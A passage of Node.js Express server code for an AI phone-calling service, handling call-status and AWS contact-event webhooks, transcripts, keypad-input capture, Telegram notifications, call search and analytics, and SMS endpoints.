    console.log(`   CallDuration: ${CallDuration || 'N/A'}`);
    console.log(`   DialCallDuration: ${DialCallDuration || 'N/A'}`);
    console.log(`   AnsweredBy: ${AnsweredBy || 'N/A'}`);
    
    // Get call details from database
    const call = await db.getCall(CallSid);
    if (!call) {
      console.warn(`⚠️ Webhook received for unknown call: ${CallSid}`.yellow);
      res.status(200).send('OK');
      return;
    }

    const normalizedStatus = (CallStatus || '').toLowerCase();
    const durationValue = parseInt(Duration || CallDuration || DialCallDuration || 0);
    const updateData = {
      duration: durationValue,
      twilio_status: CallStatus,
      answered_by: AnsweredBy,
      error_code: ErrorCode,
      error_message: ErrorMessage,
    };

    if (['answered', 'in-progress'].includes(normalizedStatus) || (normalizedStatus === 'completed' && durationValue > 0)) {
      updateData.was_answered = 1;
      if (!call.started_at) {
        updateData.started_at = new Date().toISOString();
      }
    }

    if (['completed', 'no-answer', 'failed', 'busy', 'canceled'].includes(normalizedStatus) && !call.ended_at) {
      updateData.ended_at = new Date().toISOString();
    }

    if (normalizedStatus === 'no-answer' && call.created_at) {
      const callStart = new Date(call.created_at);
      const now = new Date();
      updateData.ring_duration = Math.round((now - callStart) / 1000);
    }

    await db.updateCallStatus(CallSid, normalizedStatus, updateData);

    if (call.call_type === 'collect_input' && ['completed', 'no-answer', 'failed', 'canceled'].includes(normalizedStatus)) {
      await finalizeCollectInputCall(CallSid, call);
    }

    const targetChat = call.telegram_chat_id || call.user_chat_id;
    const enqueueStatus = async (type) => {
      if (!targetChat) {
        return;
      }
      await db.createEnhancedWebhookNotification(CallSid, type, targetChat);
    };

    if (['queued', 'initiated'].includes(normalizedStatus)) {
      await enqueueStatus('call_initiated');
    } else if (normalizedStatus === 'ringing') {
      await enqueueStatus('call_ringing');
    } else if (['in-progress', 'answered'].includes(normalizedStatus)) {
      await enqueueStatus('call_answered');
    } else if (['busy', 'failed', 'canceled', 'completed', 'no-answer'].includes(normalizedStatus)) {
      await finalizeCallOutcome(CallSid, {
        finalStatus: normalizedStatus,
        answeredBy: AnsweredBy,
      });
    }

    await db.logServiceHealth('webhook_system', 'status_received', {
      call_sid: CallSid,
      original_status: CallStatus,
      final_status: normalizedStatus,
      duration: durationValue,
      answered_by: AnsweredBy,
      correction_applied: false
    });
    
    res.status(200).send('OK');
    
  } catch (error) {
    console.error('❌ Error processing fixed call status webhook:', error);
    
    // Log error to service health
    try {
      await db.logServiceHealth('webhook_system', 'error', {
        operation: 'process_webhook',
        error: error.message,
        call_sid: req.body.CallSid
      });
    } catch (logError) {
      console.error('Failed to log webhook error:', logError);
    }
    
    res.status(200).send('OK');
  }
});


// Enhanced API endpoints with adaptation analytics

// Get call details with enhanced personality and function analytics
app.get('/api/calls/:callSid', async (req, res) => {
  try {
    const { callSid } = req.params;
    
    const call = await db.getCall(callSid);
    if (!call) {
      return res.status(404).json({ error: 'Call not found' });
    }

    const transcripts = await db.getCallTranscripts(callSid);
    const dtmfEntries = await db.getCallDtmfEntries(callSid);
    const dtmfInputs = formatDtmfEntriesForResponse(dtmfEntries);
    const callInputs = await db.getCallInputs(callSid);

    let businessContext = null;
    if (call.business_context) {
      try {
        businessContext = JSON.parse(call.business_context);
      } catch (contextError) {
        console.warn('Failed to parse business context for call detail response:', contextError.message);
      }
    }

    // Parse adaptation data
    let adaptationData = {};
    try {
      if (call.ai_analysis) {
        const analysis = JSON.parse(call.ai_analysis);
        adaptationData = analysis.adaptation || {};
      }
    } catch (e) {
      console.error('Error parsing adaptation data:', e);
    }

    // Get webhook notifications for this call
    const webhookNotifications = await new Promise((resolve, reject) => {
      db.db.all(
        `SELECT * FROM webhook_notifications WHERE call_sid = ? ORDER BY created_at DESC`,
        [callSid],
        (err, rows) => {
          if (err) reject(err);
          else resolve(rows || []);
        }
      );
    });
    
    res.json({
      call,
      transcripts,
      dtmf_inputs: dtmfInputs,
      inputs: callInputs,
      transcript_count: transcripts.length,
      transcript_preview: transcripts
        .map((entry) => entry.clean_message || entry.message || entry.raw_message || '')
        .join('\n')
        .slice(0, 500),
      adaptation_analytics: adaptationData,
      business_context: businessContext,
      webhook_notifications: webhookNotifications,
      enhanced_features: true
    });
  } catch (error) {
    console.error('Error fetching enhanced adaptive call details:', error);
    res.status(500).json({ error: 'Failed to fetch call details' });
  }
});

// Enhanced call status endpoint with real-time metrics
app.get('/api/calls/:callSid/status', async (req, res) => {
  try {
    const { callSid } = req.params;
    
    const call = await db.getCall(callSid);
    if (!call) {
      return res.status(404).json({ error: 'Call not found' });
    }

    // Get recent call states for detailed progress tracking
    const recentStates = await new Promise((resolve, reject) => {
      db.db.all(
        `SELECT state, data, timestamp FROM call_states 
         WHERE call_sid = ? 
         ORDER BY timestamp DESC 
         LIMIT 10`,
        [callSid],
        (err, rows) => {
          if (err) reject(err);
          else resolve(rows || []);
        }
      );
    });

    // Get enhanced webhook notification status
    const notificationStatus = await new Promise((resolve, reject) => {
      db.db.all(
        `SELECT notification_type, status, created_at, sent_at, delivery_time_ms, error_message 
         FROM webhook_notifications 
         WHERE call_sid = ? 
         ORDER BY created_at DESC`,
        [callSid],
        (err, rows) => {
          if (err) reject(err);
          else resolve(rows || []);
        }
      );
    });

    // Calculate enhanced call timing metrics
    let timingMetrics = {};
    if (call.created_at) {
      const now = new Date();
      const created = new Date(call.created_at);
      timingMetrics.total_elapsed = Math.round((now - created) / 1000);
      
      if (call.started_at) {
        const started = new Date(call.started_at);
        timingMetrics.time_to_answer = Math.round((started - created) / 1000);
      }
      
      if (call.ended_at) {
        const ended = new Date(call.ended_at);
        timingMetrics.call_duration = call.duration || Math.round((ended - new Date(call.started_at || call.created_at)) / 1000);
      }

      // Calculate ring duration if available
      if (call.ring_duration) {
        timingMetrics.ring_duration = call.ring_duration;
      }
    }

    res.json({
      call: {
        ...call,
        timing_metrics: timingMetrics
      },
      recent_states: recentStates,
      notification_status: notificationStatus,
      webhook_service_status: webhookService.getCallStatusStats(),
      enhanced_tracking: true
    });
    
  } catch (error) {
    console.error('Error fetching enhanced call status:', error);
    res.status(500).json({ error: 'Failed to fetch call status' });
  }
});

// Manual notification trigger endpoint (for testing)
app.post('/api/calls/:callSid/notify', async (req, res) => {
  try {
    const { callSid } = req.params;
    const { status, user_chat_id } = req.body;
    
    if (!status || !user_chat_id) {
      return res.status(400).json({ 
        error: 'Both status and user_chat_id are required' 
      });
    }

    const call = await db.getCall(callSid);
    if (!call) {
      return res.status(404).json({ error: 'Call not found' });
    }

    // Send immediate enhanced notification
    const success = await webhookService.sendImmediateStatus(callSid, status, user_chat_id);
    
    if (success) {
      res.json({ 
        success: true, 
        message: `Enhanced manual notification sent: ${status}`,
        call_sid: callSid,
        enhanced: true
      });
    } else {
      res.status(500).json({ 
        success: false, 
        error: 'Failed to send enhanced notification' 
      });
    }
    
  } catch (error) {
    console.error('Error sending enhanced manual notification:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Failed to send notification',
      details: error.message 
    });
  }
});

// Get enhanced adaptation analytics dashboard data
app.get('/api/analytics/adaptations', async (req, res) => {
  try {
    const limit = parseInt(req.query.limit) || 50;
    const calls = await db.getCallsWithTranscripts(limit);
    
    const analyticsData = {
      total_calls: calls.length,
      calls_with_adaptations: 0,
      total_adaptations: 0,
      personality_usage: {},
      industry_breakdown: {},
      adaptation_triggers: {},
      enhanced_features: true
    };

    calls.forEach(call => {
      try {
        if (call.ai_analysis) {
          const analysis = JSON.parse(call.ai_analysis);
          if (analysis.adaptation && analysis.adaptation.personalityChanges > 0) {
            analyticsData.calls_with_adaptations++;
            analyticsData.total_adaptations += analysis.adaptation.personalityChanges;
            
            // Track final personality usage
            const finalPersonality = analysis.adaptation.finalPersonality;
            if (finalPersonality) {
              analyticsData.personality_usage[finalPersonality] = 
                (analyticsData.personality_usage[finalPersonality] || 0) + 1;
            }
            
            // Track industry usage
            const industry = analysis.adaptation.businessContext?.industry;
            if (industry) {
              analyticsData.industry_breakdown[industry] = 
                (analyticsData.industry_breakdown[industry] || 0) + 1;
            }
          }
        }
      } catch (e) {
        // Skip calls with invalid analysis data
      }
    });

    analyticsData.adaptation_rate = analyticsData.total_calls > 0 ? 
      (analyticsData.calls_with_adaptations / analyticsData.total_calls * 100).toFixed(1) : 0;
    
    analyticsData.avg_adaptations_per_call = analyticsData.calls_with_adaptations > 0 ? 
      (analyticsData.total_adaptations / analyticsData.calls_with_adaptations).toFixed(1) : 0;

    res.json(analyticsData);
  } catch (error) {
    console.error('Error fetching enhanced adaptation analytics:', error);
    res.status(500).json({ error: 'Failed to fetch analytics' });
  }
});

// Enhanced notification analytics endpoint
app.get('/api/analytics/notifications', async (req, res) => {
  try {
    const limit = parseInt(req.query.limit) || 100;
    const hours = parseInt(req.query.hours) || 24;
    
    const notificationStats = await new Promise((resolve, reject) => {
      db.db.all(`
        SELECT 
          notification_type,
          status,
          COUNT(*) as count,
          AVG(CASE 
            WHEN sent_at IS NOT NULL AND created_at IS NOT NULL 
            THEN (julianday(sent_at) - julianday(created_at)) * 86400 
            ELSE NULL 
          END) as avg_delivery_time_seconds,
          AVG(delivery_time_ms) as avg_delivery_time_ms
        FROM webhook_notifications 
        WHERE created_at >= datetime('now', '-${hours} hours')
        GROUP BY notification_type, status
        ORDER BY notification_type, status
      `, (err, rows) => {
        if (err) reject(err);
        else resolve(rows || []);
      });
    });

    const recentNotifications = await new Promise((resolve, reject) => {
      db.db.all(`
        SELECT 
          wn.*,
          c.phone_number,
          c.status as call_status,
          c.twilio_status
        FROM webhook_notifications wn
        LEFT JOIN calls c ON wn.call_sid = c.call_sid
        WHERE wn.created_at >= datetime('now', '-${hours} hours')
        ORDER BY wn.created_at DESC
        LIMIT ${limit}
      `, (err, rows) => {
        if (err) reject(err);
        else resolve(rows || []);
      });
    });

    // Calculate enhanced summary metrics
    const totalNotifications = notificationStats.reduce((sum, stat) => sum + stat.count, 0);
    const successfulNotifications = notificationStats
      .filter(stat => stat.status === 'sent')
      .reduce((sum, stat) => sum + stat.count, 0);
    
    const successRate = totalNotifications > 0 ? 
      ((successfulNotifications / totalNotifications) * 100).toFixed(1) : 0;

    const avgDeliveryTime = notificationStats
      .filter(stat => stat.avg_delivery_time_seconds !== null)
      .reduce((sum, stat, _, arr) => {
        return sum + (stat.avg_delivery_time_seconds / arr.length);
      }, 0);

    // Get notification metrics from database
    const notificationMetrics = await db.getNotificationAnalytics(Math.ceil(hours / 24));

    res.json({
      summary: {
        total_notifications: totalNotifications,
        successful_notifications: successfulNotifications,
        success_rate_percent: parseFloat(successRate),
        average_delivery_time_seconds: avgDeliveryTime.toFixed(2),
        time_period_hours: hours,
        enhanced_tracking: true
      },
      notification_breakdown: notificationStats,
      recent_notifications: recentNotifications,
      historical_metrics: notificationMetrics,
      webhook_service_health: await webhookService.healthCheck()
    });
    
  } catch (error) {
    console.error('Error fetching enhanced notification analytics:', error);
    res.status(500).json({ 
      error: 'Failed to fetch notification analytics',
      details: error.message 
    });
  }
});

// Generate functions for a given prompt (testing endpoint)
app.post('/api/generate-functions', async (req, res) => {
  try {
    const { prompt, first_message } = req.body;
    
    if (!prompt || !first_message) {
      return res.status(400).json({ error: 'Both prompt and first_message are required' });
    }

    const functionSystem = functionEngine.generateAdaptiveFunctionSystem(prompt, first_message);
    
    res.json({
      success: true,
      business_context: functionSystem.context,
      functions: functionSystem.functions,
      function_count: functionSystem.functions.length,
      analysis: functionEngine.getBusinessAnalysis(),
      enhanced: true
    });
  } catch (error) {
    console.error('Error generating enhanced functions:', error);
    res.status(500).json({ error: 'Failed to generate functions' });
  }
});

// Enhanced health endpoint with comprehensive system status
app.get('/health', async (req, res) => {
  try {
    const calls = await db.getCallsWithTranscripts(1);
    const webhookHealth = await webhookService.healthCheck();
    const callStats = webhookService.getCallStatusStats();
    const notificationMetrics = await db.getNotificationAnalytics(1);
    
    // Check service health logs
    const recentHealthLogs = await new Promise((resolve, reject) => {
      db.db.all(`
        SELECT service_name, status, COUNT(*) as count
        FROM service_health_logs 
        WHERE timestamp >= datetime('now', '-1 hour')
        GROUP BY service_name, status
        ORDER BY service_name
      `, (err, rows) => {
        if (err) reject(err);
        else resolve(rows || []);
      });
    });
    
    res.json({ 
      status: 'healthy', 
      timestamp: new Date().toISOString(),
      enhanced_features: true,
      call_provider: {
        active: currentProvider,
        is_aws: isAwsProvider,
        is_vonage: currentProvider === 'vonage',
        supported: SUPPORTED_CALL_PROVIDERS
      },
      services: {
        database: {
          connected: true,
          recent_calls: calls.length
        },
        webhook_service: webhookHealth,
        call_tracking: callStats,
        notification_system: {
          total_today: notificationMetrics.total_notifications,
          success_rate: notificationMetrics.overall_success_rate + '%',
          avg_delivery_time: notificationMetrics.breakdown.length > 0 ? 
            notificationMetrics.breakdown[0].avg_delivery_time + 'ms' : 'N/A'
        }
      },
      active_calls: callConfigurations.size,
      adaptation_engine: {
        available_templates: functionEngine ? functionEngine.getBusinessAnalysis().availableTemplates.length : 0,
        active_function_systems: callFunctionSystems.size
      },
      system_health: recentHealthLogs
    });
  } catch (error) {
    console.error('Enhanced health check error:', error);
    res.status(500).json({
      status: 'unhealthy',
      timestamp: new Date().toISOString(),
      enhanced_features: true,
      error: error.message,
      services: {
        database: {
          connected: false,
          error: error.message
        },
        webhook_service: {
          status: 'error',
          reason: 'Database connection failed'
        }
      }
    });
  }
});

// Enhanced system maintenance endpoint
app.post('/api/system/cleanup', async (req, res) => {
  try {
    const { days_to_keep = 30 } = req.body;
    
    console.log(`🧹 Starting enhanced system cleanup (keeping ${days_to_keep} days)...`.yellow);
    
    const cleanedRecords = await db.cleanupOldRecords(days_to_keep);
    
    // Log cleanup operation
    await db.logServiceHealth('system_maintenance', 'cleanup_completed', {
      records_cleaned: cleanedRecords,
      days_kept: days_to_keep
    });
    
    res.json({
      success: true,
      records_cleaned: cleanedRecords,
      days_kept: days_to_keep,
      timestamp: new Date().toISOString(),
      enhanced: true
    });
    
  } catch (error) {
    console.error('Error during enhanced system cleanup:', error);
    
    await db.logServiceHealth('system_maintenance', 'cleanup_failed', {
      error: error.message
    });
    
    res.status(500).json({
      success: false,
      error: 'System cleanup failed',
      details: error.message
    });
  }
});

// Basic calls list endpoint
app.get('/api/calls', async (req, res) => {
  try {
    const limit = Math.min(parseInt(req.query.limit) || 10, 50); // Max 50 calls
    const offset = parseInt(req.query.offset) || 0;
    
    console.log(`Fetching calls list: limit=${limit}, offset=${offset}`);
    
    // Get calls from database using the new method
    const calls = await db.getRecentCalls(limit, offset);
    const totalCount = await db.getCallsCount();

    // Format the response with enhanced data
    const formattedCalls = calls.map(call => ({
      ...call,
      transcript_count: call.transcript_count || 0,
      dtmf_input_count: call.dtmf_input_count || 0,
      has_dtmf_input: (call.dtmf_input_count || 0) > 0,
      created_date: new Date(call.created_at).toLocaleDateString(),
      duration_formatted: call.duration ? 
        `${Math.floor(call.duration/60)}:${String(call.duration%60).padStart(2,'0')}` : 
        'N/A',
      // Parse JSON fields safely
      business_context: call.business_context ? 
        (() => { try { return JSON.parse(call.business_context); } catch { return null; } })() : 
        null,
      generated_functions: call.generated_functions ?
        (() => { try { return JSON.parse(call.generated_functions); } catch { return []; } })() :
        []
    }));

    res.json({
      success: true,
      calls: formattedCalls,
      pagination: {
        total: totalCount,
        limit: limit,
        offset: offset,
        has_more: offset + limit < totalCount
      },
      enhanced_features: true
    });

  } catch (error) {
    console.error('Error fetching calls list:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to fetch calls list',
      details: error.message
    });
  }
});

// Enhanced calls list endpoint with filters
app.get('/api/calls/list', async (req, res) => {
  try {
    const limit = Math.min(parseInt(req.query.limit) || 10, 50);
    const offset = parseInt(req.query.offset) || 0;
    const status = req.query.status; // Filter by status
    const phone = req.query.phone; // Filter by phone number
    const dateFrom = req.query.date_from; // Filter by date range
    const dateTo = req.query.date_to;

    let whereClause = '';
    let queryParams = [];
    
    // Build dynamic where clause
    const conditions = [];
    
    if (status) {
      conditions.push('c.status = ?');
      queryParams.push(status);
    }
    
    if (phone) {
      conditions.push('c.phone_number LIKE ?');
      queryParams.push(`%${phone}%`);
    }
    
    if (dateFrom) {
      conditions.push('c.created_at >= ?');
      queryParams.push(dateFrom);
    }
    
    if (dateTo) {
      conditions.push('c.created_at <= ?');
      queryParams.push(dateTo);
    }
    
    if (conditions.length > 0) {
      whereClause = 'WHERE ' + conditions.join(' AND ');
    }

    const query = `
      SELECT 
        c.*,
        COUNT(DISTINCT t.id) as transcript_count,
        COUNT(DISTINCT d.id) as dtmf_input_count,
        GROUP_CONCAT(DISTINCT t.speaker) as speakers,
        MIN(t.timestamp) as conversation_start,
        MAX(t.timestamp) as conversation_end
      FROM calls c
      LEFT JOIN transcripts t ON c.call_sid = t.call_sid
      LEFT JOIN dtmf_entries d ON c.call_sid = d.call_sid
      ${whereClause}
      GROUP BY c.call_sid
      ORDER BY c.created_at DESC
      LIMIT ? OFFSET ?
    `;

    queryParams.push(limit, offset);
    
    const calls = await new Promise((resolve, reject) => {
      db.db.all(query, queryParams, (err, rows) => {
        if (err) {
          console.error('Database error in enhanced calls query:', err);
          reject(err);
        } else {
          resolve(rows || []);
        }
      });
    });

    // Get filtered count
    const countQuery = `SELECT COUNT(*) as count FROM calls c ${whereClause}`;
    const totalCount = await new Promise((resolve, reject) => {
      db.db.get(countQuery, queryParams.slice(0, -2), (err, row) => {
        if (err) {
          console.error('Database error counting filtered calls:', err);
          resolve(0);
        } else {
          resolve(row?.count || 0);
        }
      });
    });

    // Enhanced formatting
    const enhancedCalls = calls.map(call => {
      const hasConversation = call.speakers && call.speakers.includes('user') && call.speakers.includes('ai');
      const conversationDuration = call.conversation_start && call.conversation_end ?
        Math.round((new Date(call.conversation_end) - new Date(call.conversation_start)) / 1000) : 0;

      return {
        call_sid: call.call_sid,
        phone_number: call.phone_number,
        status: call.status,
        twilio_status: call.twilio_status,
        created_at: call.created_at,
        started_at: call.started_at,
        ended_at: call.ended_at,
        duration: call.duration,
        transcript_count: call.transcript_count || 0,
        dtmf_input_count: call.dtmf_input_count || 0,
        has_dtmf_input: (call.dtmf_input_count || 0) > 0,
        has_conversation: hasConversation,
        conversation_duration: conversationDuration,
        call_summary: call.call_summary,
        user_chat_id: call.user_chat_id,
        // Enhanced metadata
        business_context: call.business_context ? 
          (() => { try { return JSON.parse(call.business_context); } catch { return null; } })() : null,
        generated_functions_count: call.generated_functions ?
          (() => { try { return JSON.parse(call.generated_functions).length; } catch { return 0; } })() : 0,
        // Formatted fields
        created_date: new Date(call.created_at).toLocaleDateString(),
        created_time: new Date(call.created_at).toLocaleTimeString(),
        duration_formatted: call.duration ? 
          `${Math.floor(call.duration/60)}:${String(call.duration%60).padStart(2,'0')}` : 'N/A',
        status_icon: getStatusIcon(call.status),
        enhanced: true
      };
    });

    res.json({
      success: true,
      calls: enhancedCalls,
      filters: {
        status,
        phone,
        date_from: dateFrom,
        date_to: dateTo
      },
      pagination: {
        total: totalCount,
        limit: limit,
        offset: offset,
        has_more: offset + limit < totalCount,
        current_page: Math.floor(offset / limit) + 1,
        total_pages: Math.ceil(totalCount / limit)
      },
      enhanced_features: true
    });

  } catch (error) {
    console.error('Error in enhanced calls list:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to fetch enhanced calls list',
      details: error.message
    });
  }
});

// Helper function for status icons
function getStatusIcon(status) {
  const icons = {
    'completed': '✅',
    'no-answer': '📵',
    'busy': '📞',
    'failed': '❌',
    'canceled': '🚫',
    'in-progress': '🔄',
    'ringing': '📲'
  };
  return icons[status] || '❓';
}

// Add calls analytics endpoint
app.get('/api/calls/analytics', async (req, res) => {
  try {
    const days = parseInt(req.query.days) || 7;
    const dateFrom = new Date(Date.now() - (days * 24 * 60 * 60 * 1000)).toISOString();

    // Get comprehensive analytics
    const analytics = await new Promise((resolve, reject) => {
      const queries = {
        // Total calls in period
        totalCalls: `SELECT COUNT(*) as count FROM calls WHERE created_at >= ?`,
        
        // Calls by status
        statusBreakdown: `
          SELECT status, COUNT(*) as count 
          FROM calls 
          WHERE created_at >= ? 
          GROUP BY status 
          ORDER BY count DESC
        `,
        
        // Average call duration
        avgDuration: `
          SELECT AVG(duration) as avg_duration 
          FROM calls 
          WHERE created_at >= ? AND duration > 0
        `,
        
        // Success rate (completed calls with conversation)
        successRate: `
          SELECT 
            COUNT(CASE WHEN c.status = 'completed' AND t.transcript_count > 0 THEN 1 END) as successful,
            COUNT(*) as total
          FROM calls c
          LEFT JOIN (
            SELECT call_sid, COUNT(*) as transcript_count 
            FROM transcripts 
            WHERE speaker = 'user' 
            GROUP BY call_sid
          ) t ON c.call_sid = t.call_sid
          WHERE c.created_at >= ?
        `,
        
        // Daily call volume
        dailyVolume: `
          SELECT 
            DATE(created_at) as date,
            COUNT(*) as calls,
            COUNT(CASE WHEN status = 'completed' THEN 1 END) as completed
          FROM calls 
          WHERE created_at >= ? 
          GROUP BY DATE(created_at) 
          ORDER BY date DESC
        `
      };

      const results = {};
      let completed = 0;
      const total = Object.keys(queries).length;

      for (const [key, query] of Object.entries(queries)) {
        db.db.all(query, [dateFrom], (err, rows) => {
          if (err) {
            console.error(`Analytics query error for ${key}:`, err);
            results[key] = null;
          } else {
            results[key] = rows;
          }
          
          completed++;
          if (completed === total) {
            resolve(results);
          }
        });
      }
    });

    // Process analytics data
    const processedAnalytics = {
      period: {
        days: days,
        from: dateFrom,
        to: new Date().toISOString()
      },
      summary: {
        total_calls: analytics.totalCalls?.[0]?.count || 0,
        average_duration: analytics.avgDuration?.[0]?.avg_duration ? 
          Math.round(analytics.avgDuration[0].avg_duration) : 0,
        success_rate: analytics.successRate?.[0] ? 
          Math.round((analytics.successRate[0].successful / analytics.successRate[0].total) * 100) : 0
      },
      status_breakdown: analytics.statusBreakdown || [],
      daily_volume: analytics.dailyVolume || [],
      enhanced_features: true
    };

    res.json(processedAnalytics);

  } catch (error) {
    console.error('Error fetching call analytics:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to fetch analytics',
      details: error.message
    });
  }
});

// Search calls endpoint
app.get('/api/calls/search', async (req, res) => {
  try {
    const query = req.query.q;
    const limit = Math.min(parseInt(req.query.limit) || 20, 50);
    
    if (!query || query.length < 2) {
      return res.status(400).json({
        success: false,
        error: 'Search query must be at least 2 characters'
      });
    }

    // Search in calls and transcripts
    const searchResults = await new Promise((resolve, reject) => {
      const searchQuery = `
        SELECT DISTINCT
          c.*,
          COUNT(t.id) as transcript_count,
          GROUP_CONCAT(t.message, ' ') as conversation_text
        FROM calls c
        LEFT JOIN transcripts t ON c.call_sid = t.call_sid
        WHERE 
          c.phone_number LIKE ? OR
          c.call_summary LIKE ? OR
          c.prompt LIKE ? OR
          c.first_message LIKE ? OR
          t.message LIKE ?
        GROUP BY c.call_sid
        ORDER BY c.created_at DESC
        LIMIT ?
      `;
      
      const searchTerm = `%${query}%`;
      const params = [searchTerm, searchTerm, searchTerm, searchTerm, searchTerm, limit];
      
      db.db.all(searchQuery, params, (err, rows) => {
        if (err) {
          console.error('Search query error:', err);
          reject(err);
        } else {
          resolve(rows || []);
        }
      });
    });

    const formattedResults = searchResults.map(call => ({
      call_sid: call.call_sid,
      phone_number: call.phone_number,
      status: call.status,
      created_at: call.created_at,
      duration: call.duration,
      transcript_count: call.transcript_count || 0,
      call_summary: call.call_summary,
      // Highlight matching text (basic implementation)
      matching_text: call.conversation_text ? 
        call.conversation_text.substring(0, 200) + '...' : null,
      created_date: new Date(call.created_at).toLocaleDateString(),
      duration_formatted: call.duration ? 
        `${Math.floor(call.duration/60)}:${String(call.duration%60).padStart(2,'0')}` : 'N/A'
    }));

    res.json({
      success: true,
      query: query,
      results: formattedResults,
      result_count: formattedResults.length,
      enhanced_search: true
    });

  } catch (error) {
    console.error('Error in call search:', error);
    res.status(500).json({
      success: false,
      error: 'Search failed',
      details: error.message
    });
  }
});

// SMS webhook endpoints
app.post('/webhook/sms', async (req, res) => {
    try {
        const { From, Body, MessageSid, SmsStatus } = req.body;

        console.log(`📨 SMS webhook: ${From} -> ${Body}`);

        // Handle incoming SMS with AI
        const result = await smsService.handleIncomingSMS(From, Body, MessageSid);

        // Save to database if needed
        if (db) {
            await db.saveSMSMessage({
                message_sid: MessageSid,
                from_number: From,
                body: Body,
                status: SmsStatus,
                direction: 'inbound',
                ai_response: result.ai_response,
                response_message_sid: result.message_sid
            });
        }

        res.status(200).send('OK');
    } catch (error) {
        console.error('❌ SMS webhook error:', error);
    res.status(500).send('Error');
  }
});

app.post('/aws/transcripts', async (req, res) => {
  if (!isAwsProvider) {
    return res.status(404).json({ error: 'AWS transcription endpoint disabled for current provider' });
  }

  try {
    const { callSid, contactId, transcript, isPartial } = req.body || {};
    const resolvedCallSid = callSid || (contactId ? awsContactIndex.get(contactId) : undefined);

    if (!resolvedCallSid) {
      return res.status(404).json({ error: 'Unknown call session for transcript payload' });
    }

    const session = awsCallSessions.get(resolvedCallSid);
    if (!session) {
      return res.status(404).json({ error: 'Call session not initialized' });
    }

    if (!transcript) {
      return res.status(200).json({ received: true, ignored: true });
    }

    if (isPartial) {
      session.lastPartial = transcript;
      return res.json({ received: true, partial: true });
    }

    console.log(`👤 (AWS) Customer: ${transcript}`.yellow);

    try {
      await db.addTranscript({
        call_sid: resolvedCallSid,
        speaker: 'user',
        message: transcript,
        interaction_count: session.interactionCount
      });

      await db.updateCallState(resolvedCallSid, 'user_spoke', {
        message: transcript,
        interaction_count: session.interactionCount,
        contact_id: session.contactId
      });
    } catch (dbError) {
      console.error('Database error adding AWS user transcript:', dbError);
    }

    session.gptService.completion(transcript, session.interactionCount);
    session.interactionCount += 1;

    res.json({ received: true });
  } catch (error) {
    console.error('Error processing AWS transcript payload:', error);
    res.status(500).json({ error: 'Failed to process transcript' });
  }
});

app.post('/aws/contact-events', async (req, res) => {
  if (!isAwsProvider) {
    return res.status(404).json({ error: 'AWS contact events endpoint disabled for current provider' });
  }

  try {
    const payload = req.body || {};
    const contactId = payload.contactId || payload.ContactId || payload.detail?.contactId || payload.detail?.ContactId;
    const resolvedCallSid = payload.callSid || (contactId ? awsContactIndex.get(contactId) : undefined);
    const eventTypeRaw = payload.eventType || payload.EventType || payload.detail?.eventType || payload.detail?.ContactStatus || '';
    const eventType = (eventTypeRaw || '').toLowerCase();

    if (!contactId) {
      return res.status(400).json({ error: 'Missing contactId in contact event payload' });
    }

    if (resolvedCallSid) {
      await db.updateCallState(resolvedCallSid, 'connect_event', {
        event_type: eventType,
        payload: JSON.stringify(payload)
      });
    }

    const awsDigitsCandidate =
      extractDigitsFromPayload(payload.dtmfDigits) ||
      extractDigitsFromPayload(payload.dtmf) ||
      extractDigitsFromPayload(payload.customerInput) ||
      extractDigitsFromPayload(payload.detail?.dtmfDigits) ||
      extractDigitsFromPayload(payload.detail?.customerInput) ||
      extractDigitsFromPayload(payload.detail?.customer_input) ||
      extractDigitsFromPayload(payload.detail?.dtmf) ||
      extractDigitsFromPayload(payload.detail?.input);

    if (resolvedCallSid && awsDigitsCandidate) {
      await persistDtmfCapture(resolvedCallSid, awsDigitsCandidate, {
        source: 'aws',
        provider: 'aws',
        capture_method: 'aws_event',
        metadata: {
          contact_id: contactId,
          event_type: eventType,
        },
      });
    }

    let normalizedStatus = null;
    let notificationType = null;

    switch (eventType) {
      case 'queued':
      case 'queue':
        normalizedStatus = 'initiated';
        notificationType = 'call_initiated';
        break;
      case 'connected':
      case 'customer_connected':
      case 'agent_connected':
      case 'connected_to_customer':
        normalizedStatus = 'in-progress';
        notificationType = 'call_answered';
        break;
      case 'disconnected':
      case 'completed':
      case 'contact_disconnected':
        normalizedStatus = 'completed';
        notificationType = 'call_completed';
        break;
      default:
        break;
    }

    if (resolvedCallSid && normalizedStatus) {
      await db.updateCallStatus(resolvedCallSid, normalizedStatus, {
        provider: currentProvider,
        provider_contact_id: contactId
      });

      const callRecord = await db.getCall(resolvedCallSid);
      const realtimeTypes = new Set(['call_initiated', 'call_ringing', 'call_answered']);
      if (callRecord?.user_chat_id && notificationType && realtimeTypes.has(notificationType)) {
        await db.createEnhancedWebhookNotification(resolvedCallSid, notificationType, callRecord.user_chat_id);
      }

      if (normalizedStatus === 'completed') {
        const session = awsCallSessions.get(resolvedCallSid);
        const startTime = session?.startTime || new Date();
        await handleCallEnd(resolvedCallSid, startTime);
        awsCallSessions.delete(resolvedCallSid);
        activeCalls.delete(resolvedCallSid);
        awsContactIndex.delete(contactId);
        callConfigurations.delete(resolvedCallSid);
        callFunctionSystems.delete(resolvedCallSid);
        await finalizeCallOutcome(resolvedCallSid, {
          call: callRecord,
          finalStatus: normalizedStatus,
          answeredBy: callRecord?.answered_by,
          wasAnswered: true,
        });
      }
    }

    res.json({ received: true, call_sid: resolvedCallSid || null, contact_id: contactId });
  } catch (error) {
    console.error('Error processing AWS contact event:', error);
    res.status(500).json({ error: 'Failed to process contact event' });
  }
});

app.post('/webhook/sms-status', async (req, res) => {
    try {
        const { MessageSid, MessageStatus, ErrorCode, ErrorMessage } = req.body;

        console.log(`📱 SMS status update: ${MessageSid} -> ${MessageStatus}`);

        if (db) {
            await db.updateSMSStatus(MessageSid, {
                status: MessageStatus,
                error_code: ErrorCode,
                error_message: ErrorMessage,
                updated_at: new Date()
            });
        }

        res.status(200).send('OK');
    } catch (error) {
        console.error('❌ SMS status webhook error:', error);
        res.status(500).send('OK'); // Return OK to prevent retries
    }
});

// Send single SMS endpoint
app.post('/api/sms/send', async (req, res) => {
    try {
        const {
            to,
            message,
            from,
            user_chat_id,
            business_id,
            purpose,
            emotion,
            urgency,
            technical_level,
            channel,
            template_name,
            template_variables = {}
        } = req.body;

        const templateName = template_name;
        const templateVariables = template_variables || {};

        if (!to || !message) {
            return res.status(400).json({
                success: false,
                error: 'Phone number and message are required'
            });
        }

